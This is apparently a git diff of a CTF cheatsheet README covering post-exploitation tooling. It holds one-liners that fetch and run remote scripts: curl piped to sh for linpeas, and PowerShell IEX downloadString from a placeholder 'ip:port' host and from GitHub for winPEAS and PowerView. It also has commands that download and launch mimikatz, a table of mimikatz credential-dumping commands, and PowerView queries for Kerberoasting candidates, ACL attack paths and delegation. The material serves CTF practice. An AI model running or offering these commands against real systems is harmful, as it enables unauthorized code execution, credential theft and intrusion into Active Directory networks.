@@ -25,6 +25,7 @@ A collection of all my cheatsheets as well as scripts for CTFs
 
 # Index
 
+## Linpeas
 > [linpeas](https://github.com/peass-ng/PEASS-ng/blob/master/linPEAS/README.md)
 ```sh
 #local_version
@@ -34,16 +35,16 @@ curl -L https://raw.githubusercontent.com/Aaryan-khairnar/cheatsheets/refs/heads
 curl -L http://ip:port/linpeas.sh | sh
 ```
 
+## Winpeas
 > [winpeas.exe](https://github.com/peass-ng/PEASS-ng/blob/master/winPEAS/winPEASexe/README.md)
 > [winpeas.ps1](https://github.com/peass-ng/PEASS-ng/blob/master/winPEAS/winPEASps1/README.md)
 ```ps1
-#local_version
-
 powershell "IEX(New-Object Net.WebClient).downloadString('https://raw.githubusercontent.com/Aaryan-khairnar/cheatsheets/refs/heads/main/winpeas.ps1')"
 
 powershell "IEX(New-Object Net.WebClient).downloadString('http://ip:port/winpeas.ps1')"
 ```
 
+## Mimikatz
 > [mimikatz.exe click to download](https://github.com/ParrotSec/mimikatz/raw/refs/heads/master/Win32/mimikatz.exe)
 ```ps1
 
@@ -51,7 +52,6 @@ Invoke-WebRequest -Uri "http://ip:port/mimikatz.exe" -OutFile "$env:TEMP\tool.ex
 
 Invoke-WebRequest -Uri "https://github.com/Aaryan-khairnar/cheatsheets/raw/refs/heads/main/mimikatz.exe" -OutFile "$env:TEMP\tool.exe"; Start-Process "$env:TEMP\mimikatz.exe"
 curl -L "https://github.com/Aaryan-khairnar/cheatsheets/raw/refs/heads/main/mimikatz.exe" -o mimikatz.exe
-
 ```
 
 #### mimikatz commands
@@ -89,5 +89,70 @@ lsadump::cache                | Examines cached domain logon data
 crypto::certificates          | Examines certificates in supported certificate stores
 vault::list                   | Lists supported Windows Vault information
 dpapi::blob                   | Works with DPAPI-protected blobs
+
+## Powerview
+
+```
+IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1")
+
+IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/Aaryan-khairnar/cheatsheets/refs/heads/main/powerview.ps1")
+
+IEX (New-Object Net.WebClient).DownloadString("http://ip:port/PowerView.ps1")
+```
+
+## Important PowerView Commands for AD CTFs
+
+Command                                  | Purpose
+-----------------------------------------|------------------------------------------------------------
+Get-Domain                              | Retrieves information about the current domain
+Get-DomainController                    | Finds domain controllers
+Get-DomainUser                           | Enumerates domain users
+Get-DomainComputer                       | Enumerates domain computers
+Get-DomainGroup                          | Enumerates domain groups
+Get-DomainGroupMember                    | Lists members of a specified group
+Get-DomainPolicy                         | Retrieves domain policy information
+Get-DomainOU                             | Enumerates Organizational Units
+Get-DomainGPO                            | Enumerates Group Policy Objects
+Get-DomainGPOLocalGroup                  | Identifies local group membership configured through GPOs
+
+### Important User and Group Queries
+
+Get-DomainUser -Identity <username>      | Retrieves details for a specific user
+Get-DomainUser -SPN                      | Finds users with Service Principal Names (Kerberoasting candidates)
+Get-DomainUser -PreauthNotRequired       | Finds accounts that do not require Kerberos pre-authentication
+Get-DomainGroup -Identity "<group>"      | Retrieves details for a specific group
+Get-DomainGroupMember -Identity "<group>"| Lists members of a specific group
+Find-DomainUserLocation                  | Finds computers where domain users may be logged on
+
+### Domain Trusts and Relationships
+
+Get-DomainTrust                          | Enumerates domain trusts
+Get-Forest                               | Retrieves forest information
+Get-ForestDomain                         | Lists domains in the forest
+Get-ForestTrust                          | Enumerates forest trusts
+
+### Permissions and Attack-Path Enumeration
+
+Find-InterestingDomainAcl                | Finds interesting domain ACLs
+Get-DomainObjectAcl                      | Retrieves ACLs on domain objects
+Get-ObjectAcl                            | Retrieves ACLs on specified objects (availability depends on version)
+Find-LocalAdminAccess                    | Checks where the current user has local administrator access
+Get-DomainComputer -Unconstrained        | Finds computers configured for unconstrained delegation
+Get-DomainUser -TrustedToAuth             | Finds users configured for constrained delegation
+Get-DomainComputer -TrustedToAuth        | Finds computers configured for constrained delegation
+
+### Shares and Local Computer Enumeration
+
+Find-DomainShare                         | Searches for domain file shares
+Find-InterestingDomainShareFile           | Searches shares for potentially interesting files
+Get-NetLocalGroup                        | Enumerates local groups on accessible computers
+Get-NetLocalGroupMember                  | Lists members of local groups on accessible computers
+
+### Useful Reminders
+
+- Run PowerView from a PowerShell session where the script is loaded.
+- Some commands require domain connectivity or sufficient permissions.
+- PowerView function names and supported parameters vary by version.
+- Start with domain, user, group, computer, and trust enumeration before investigating ACLs and delegation.
 
 
